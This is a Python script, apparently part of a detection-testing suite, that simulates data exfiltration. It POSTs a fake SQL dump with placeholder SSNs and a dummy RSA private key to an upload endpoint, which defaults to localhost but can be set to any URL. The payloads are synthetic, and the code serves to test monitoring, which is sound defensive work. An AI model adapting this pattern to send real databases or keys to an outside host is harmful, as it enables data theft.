import requests
import time
import sys

def run_data_exfil(target_url="http://127.0.0.1:8080/upload"):
    print(f"\n[*] [ATTACK 6] Starting Data Exfiltration Simulation against {target_url}...")
    
    # 1. Simulate sensitive archive exfiltration
    print("    [EXFIL 1] Exfiltrating sensitive corporate database backup (.dump)...")
    try:
        dummy_db_data = "CREATE TABLE users (id INT, ssn VARCHAR(11), salary INT);\n" + ("INSERT INTO users VALUES (1, '000-11-2222', 150000);\n" * 50)
        resp = requests.post(f"{target_url}?filename=customer_database_2026.sql", data=dummy_db_data, timeout=3)
        print(f"    [+] Transferred database archive: HTTP {resp.status_code}")
    except Exception as e:
        print(f"    [!] Error: {e}")

    time.sleep(0.5)

    # 2. Simulate RSA Private Key exfiltration
    print("    [EXFIL 2] Exfiltrating unencrypted RSA private key...")
    try:
        rsa_key_payload = (
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEowIBAAKCAQEA0Y3wVq28h9c8w0t7yF2x9J7qL8m2k5v9w3x7y8z9a0b1c2d3\n"
            "e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5\n"
            "-----END RSA PRIVATE KEY-----\n"
        )
        resp = requests.post(f"{target_url}?file=id_rsa", data=rsa_key_payload, timeout=3)
        print(f"    [+] Transferred private key: HTTP {resp.status_code}")
    except Exception as e:
        print(f"    [!] Error: {e}")

    print("[+] Data exfiltration simulation complete.\n")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/upload"
    run_data_exfil(url)
